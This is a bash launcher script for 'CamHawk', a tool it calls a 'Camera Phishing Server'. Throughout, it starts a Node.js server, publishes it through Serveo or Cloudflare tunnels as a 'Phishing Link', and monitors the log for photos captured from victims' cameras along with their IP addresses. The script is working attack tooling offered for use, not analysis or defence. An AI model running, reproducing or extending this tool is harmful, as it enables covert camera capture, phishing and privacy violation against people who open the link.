#!/bin/bash

# Colors
GREEN="\e[32m"
RED="\e[31m"
BLUE="\e[34m"
YELLOW="\e[33m"
RESET="\e[0m"

# Variables
SERVER_PORT=3000
SERVER_PID=""
TUNNEL_PID=""
PHISHING_URL=""
TUNNEL_CHOICE=""

# Banner
banner() {
 clear
 echo -e "${YELLOW}"
 cat << "EOF" 

   _____                _    _                _    
  / ____|              | |  | |              | |   
 | |     __ _ _ __ ___ | |__| | __ ___      _| | __
 | |    / _` | '_ ` _ \|  __  |/ _` \ \ /\ / / |/ /
 | |___| (_| | | | | | | |  | | (_| |\ V  V /|   < 
  \_____\__,_|_| |_| |_|_|  |_|\__,_| \_/\_/ |_|\_\
                                                   
                                                             
                                Developer : Sreeraj

EOF
 echo -e "${GREEN}* GitHub: https://github.com/s-r-e-e-r-a-j\n${RESET}"
}

# Install Dependencies
install_dependencies() {
    echo -e "${YELLOW}[+] Checking dependencies...${RESET}"
    
    command -v node > /dev/null 2>&1 || { 
        echo -e "${RED}[-] Node.js is not installed! Installing...${RESET}"; 
        sudo apt install nodejs -y; 
    }

    command -v npm > /dev/null 2>&1 || { 
        echo -e "${RED}[-] npm is not installed! Installing...${RESET}"; 
        sudo apt install npm -y; 
    }

    command -v ssh > /dev/null 2>&1 || { 
        echo -e "${RED}[-] OpenSSH is not installed! Installing...${RESET}"; 
        sudo apt install openssh-client -y; 
    }

    npm list -g --depth=0 | grep -q 'express@' || { 
        echo -e "${RED}[-] Express.js is not installed! Installing...${RESET}"; 
        sudo npm install -g express; 
    }

    command -v cloudflared > /dev/null 2>&1 || { 
        echo -e "${RED}[-] Cloudflared is not installed! Installing...${RESET}"; 
        sudo wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O /usr/local/bin/cloudflared && sudo chmod +x /usr/local/bin/cloudflared; 
    }

    echo -e "${GREEN}[+] All dependencies are installed!${RESET}"
}

# Kill Any Existing Server on Port 3000
kill_old_server() {
    OLD_PID=$(lsof -ti :$SERVER_PORT)
    if [[ ! -z "$OLD_PID" ]]; then
        echo -e "${YELLOW}[+] Killing old server running on port $SERVER_PORT...${RESET}"
        kill -9 $OLD_PID
        echo -e "${GREEN}[+] Old server stopped!${RESET}"
    fi
}

# Start the Node.js Server
start_server() {
    echo -e "${YELLOW}[+] Starting Camera Phishing Server...${RESET}"
    node server.js > server.log 2>&1 &
    SERVER_PID=$!
    sleep 2

    if ps -p $SERVER_PID > /dev/null; then
        echo -e "${GREEN}[+] Server started successfully!${RESET}"
    else
        echo -e "${RED}[-] Server failed to start!${RESET}"
        exit 1
    fi
}

# Tunnel Selection Menu
select_tunnel() {
    echo -e "${YELLOW}[+] Select a tunnel:${RESET}"
    echo -e "${BLUE}[1] Serveo.net (Recommended)${RESET}"
    echo -e "${BLUE}[2] Cloudflared${RESET}"
    echo -ne "${GREEN}Enter choice (1 or 2):${RESET} "
    read  choice

    case $choice in
        1) TUNNEL_CHOICE="serveo" ;;
        2) TUNNEL_CHOICE="cloudflared" ;;
        *) echo -e "${RED}[-] Invalid choice! Defaulting to Serveo.net.${RESET}"; TUNNEL_CHOICE="serveo" ;;
    esac
}

# Start Serveo.net Tunneling
start_serveo() {
    echo -e "${YELLOW}[+] Starting Serveo.net tunnel...${RESET}"
    ssh -R 80:localhost:$SERVER_PORT serveo.net > serveo.txt 2>&1 &
    TUNNEL_PID=$!
    sleep 5

    if grep -q "Forwarding HTTP traffic" serveo.txt; then
        PHISHING_URL=$(grep -oE "https?://[a-zA-Z0-9.-]+\.serveo.net" serveo.txt)
        echo -e "${GREEN}[+] Phishing Link: ${PHISHING_URL}${RESET}"
    else
        echo -e "${RED}[-] Serveo failed!${RESET}"
        stop_server
        exit 1
    fi
}

# Start Cloudflared Tunneling (Fixed)
start_cloudflared() {
    echo -e "${YELLOW}[+] Starting Cloudflared tunnel...${RESET}"
    cloudflared tunnel --url "http://localhost:$SERVER_PORT" > cloudflared.txt 2>&1 &
    TUNNEL_PID=$!
    sleep 5

    # Wait for Cloudflared to generate the link properly
    for i in {1..10}; do
        PHISHING_URL=$(grep -oE "https://[a-zA-Z0-9.-]+\.trycloudflare.com" cloudflared.txt)
        if [[ ! -z "$PHISHING_URL" ]]; then
            echo -e "${GREEN}[+] Phishing Link: ${PHISHING_URL}${RESET}"
            return
        fi
        sleep 1
    done

    echo -e "${RED}[-] Cloudflared failed to start!${RESET}"
    stop_server
    exit 1
}

# Monitor for Received Photos
monitor_photos() {
    echo -e "${YELLOW}[+] Waiting for photos...${RESET}"
    tail -f server.log | while read line; do
        if echo "$line" | grep -q "Photo received"; then
            IP=$(echo "$line" | grep -oE "IP: [0-9]+\.[0-9]+\.[0-9]+\.[0-9]+" | cut -d ' ' -f2)
            echo -e "${GREEN}[+] Photo Received! User IP: ${IP}${RESET}"
        fi
    done
}

# Stop the Server
stop_server() {
    echo -e "${YELLOW}[+] Stopping CamHawk server...${RESET}"
    [[ ! -z "$SERVER_PID" ]] && kill $SERVER_PID 2>/dev/null && echo -e "${GREEN}[+] Server stopped!${RESET}"
    [[ ! -z "$TUNNEL_PID" ]] && kill $TUNNEL_PID 2>/dev/null && echo -e "${GREEN}[+] Tunnel stopped!${RESET}"
    exit 0
}

# Trap Ctrl+C to stop the server
trap stop_server SIGINT

# Run the script
banner
install_dependencies
kill_old_server
start_server
select_tunnel

if [[ "$TUNNEL_CHOICE" == "serveo" ]]; then
    start_serveo
else
    start_cloudflared
fi

monitor_photos
